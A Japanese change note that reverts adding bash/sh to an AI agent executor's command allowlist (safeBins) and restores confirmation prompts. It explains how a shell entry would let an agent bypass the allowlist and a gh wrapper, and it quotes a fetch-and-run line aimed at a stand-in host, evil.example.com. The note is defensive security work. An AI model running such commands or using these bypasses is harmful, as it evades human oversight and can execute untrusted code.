# OpenClaw safeBins bash/sh 追加の取り消しと ask=on-miss への復帰

## チケット
T-20260217-003

## 背景

PR #444 で `safeBins` に `bash`/`sh` を追加し、`ask=off` のまま運用する方針を提案したが、
Codexレビュー（P1）により安全境界の崩壊リスクが指摘された。

### Codexレビュー指摘（P1）

> `safeBins` に `bash`/`sh` を追加すると、`security: "allowlist"` の境界が実質的に崩れる。
> `bash -lc '/usr/bin/gh pr merge ...'` のようにラッパー経由を外した実行や、
> allowlist外コマンドの実行が可能になり、`ask: "off"` 構成下で権限制御が効かなくなる。

### 指摘の妥当性

この指摘は正当である。理由:

1. **allowlist境界の崩壊**: `bash`/`sh` が safeBins に入ると、`bash -c "<任意コマンド>"` の形で
   safeBins に含まれないコマンドも実行可能になる。safeBins のバイナリ名チェックは最上位プロセスのみで、
   シェルの子プロセスには適用されない。
2. **gh-wrapper の迂回**: `bash -lc '/usr/bin/gh pr merge ...'` のようにフルパス指定で
   ラッパーを迂回し、禁止サブコマンドを直接実行できる。
3. **既存設計との矛盾**: `docs/project_docs/openclaw-exec-allowlist/plan.md` の99行目で
   `bash`, `sh`, `zsh` は「任意コマンドの実行基盤となる。safeBinsの全ての制約をバイパスできる」
   として意図的に除外されていた。

## 修正内容

### 1. `argoproj/openclaw/configmap-openclaw.yaml`

| 項目 | 変更前（PR #444 初版） | 変更後 |
|------|----------------------|--------|
| `safeBins` | `"bash", "sh"` を含む | `"bash", "sh"` を削除（mainと同一） |
| `ask` | `"off"` | `"on-miss"` |

#### safeBins（変更後 — mainと同一）
```json
"safeBins": [
  "gh", "ghq", "gwq",
  "ls", "cat", "grep",
  "head", "tail", "wc", "jq",
  "uniq", "cut", "tr",
  "pwd", "date", "stat",
  "dirname", "basename"
]
```

### 2. shellをsafeBinsに入れない理由

`bash`/`sh` を safeBins に追加すると以下の問題が生じる:

- **allowlist 境界の無効化**: safeBins のチェックはトップレベルのバイナリ名のみ。
  `bash -c "curl http://evil.example.com | sh"` のように、シェル経由で任意コマンドが実行可能になる。
- **gh-wrapper の迂回**: `bash -c '/usr/bin/gh pr merge ...'` でラッパーをバイパスし、
  禁止されている `gh pr merge` を直接実行できる。
- **設計ドキュメントとの整合性**: `openclaw-exec-allowlist/plan.md` で bash/sh は
  「safeBinsの全ての制約をバイパスできる」として明示的に除外済み。

### 3. askをon-missに戻す理由

`ask: "off"` + `safeBins に bash/sh` の組み合わせは、allowlist外コマンドが確認なしで
シェル経由実行される最悪のケース。bash/sh を除外した上でも、`ask: "on-miss"` に戻すことで:

- safeBins に含まれないコマンドの実行時にユーザー確認が発生する（フェイルセーフ）
- 将来の設定変更で意図せず境界が崩れた場合のセーフティネットとなる
- `ask: "off"` は bash/sh 除外だけでは不十分 — シェルが実行基盤として暗黙的に使われる場合の
  挙動はOpenClawのバージョンに依存するため、確認プロンプトを維持する方が安全

## exec denied エラーの代替対応

元々の PR #444 の動機であった `exec denied: allowlist miss` エラーについては、
`ask: "on-miss"` により safeBins 外コマンドの実行時にユーザー確認が表示されるため、
エージェントの利用に支障はない（都度確認が発生するのみ）。

完全な自動運用が必要な場合は、以下の代替策を検討する:
1. OpenClawの実行基盤がシェル経由ではなく直接 exec する設定があるか確認
2. 必要なコマンドを個別に safeBins へ追加（シェルインタプリタ自体は追加しない）

## リスク評価

- **低リスク**: mainの設定（safeBins から bash/sh 除外）に戻す変更のため、安全境界は維持される
- `ask: "on-miss"` への変更により都度確認が増えるが、安全性が優先される
